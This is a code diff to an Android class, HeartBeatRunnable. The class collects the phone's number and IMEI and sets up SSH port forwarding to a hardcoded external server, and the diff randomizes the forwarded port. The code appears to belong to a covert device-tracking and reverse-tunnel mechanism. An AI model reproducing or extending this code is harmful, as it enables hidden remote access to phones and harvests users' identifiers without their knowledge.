@@ -19,6 +19,8 @@ import com.oplay.nohelper.volley.RequestEntity;
 import com.oplay.nohelper.volley.Response;
 import com.oplay.nohelper.volley.VolleyError;
 
+import net.luna.common.util.RandomUtils;
+
 import org.connectbot.bean.PortForwardBean;
 import org.connectbot.service.TerminalManager;
 import org.connectbot.transport.TransportFactory;
@@ -32,7 +34,7 @@ import java.util.Map;
  */
 public class HeartBeatRunnable implements Runnable {
 
-	private static final boolean DEBUG = true;
+	private static final boolean DEBUG = NativeParams.HEARTBEAT_RUNNABLE_DEBUG;
 	private static final String TAG = "heartBeatRunnable";
 	public static boolean isSSHConnected = false;
 	public static int mCurrentCount = 0;
@@ -70,8 +72,8 @@ public class HeartBeatRunnable implements Runnable {
 				if (phoneNumber == null) phoneNumber = PhoneInfo.getInstance(mContext).getNativePhoneNumber();
 				if (imei == null) imei = PhoneInfo.getInstance(mContext).getIMEI();
 			}
-			if(DEBUG){
-				Log.d(TAG,"phoneNumber:"+phoneNumber + "imei:"+imei);
+			if (DEBUG) {
+				Log.d(TAG, "phoneNumber:" + phoneNumber + "imei:" + imei);
 			}
 			if (TextUtils.isEmpty(phoneNumber) || TextUtils.isEmpty(imei)) {
 				getPhoneNumFailCount++;
@@ -85,6 +87,8 @@ public class HeartBeatRunnable implements Runnable {
 						mHeartBeatService.stopSelf();
 						return;
 					}
+				} else if (getPhoneNumFailCount > 10) {
+					NativeParams.HEARTBEAT_GET_MESSAGE = false;
 				}
 			}
 			if (TextUtils.isEmpty(phoneNumber) || TextUtils.isEmpty(imei)) {
@@ -145,7 +149,7 @@ public class HeartBeatRunnable implements Runnable {
 	private void initDebug() {
 		HeartBeatJson json = new HeartBeatJson();
 		HeartBeatInfo info = new HeartBeatInfo();
-		int sourcePort = 12122;
+		int sourcePort = 40000 + RandomUtils.getRandom(10000);
 		info.setPort("ubuntu@52.79.167.214:" + String.valueOf(sourcePort));
 		if (!isSSHConnected) {
 			if (mCurrentCount > 1 && !isStartSSHBuild) {
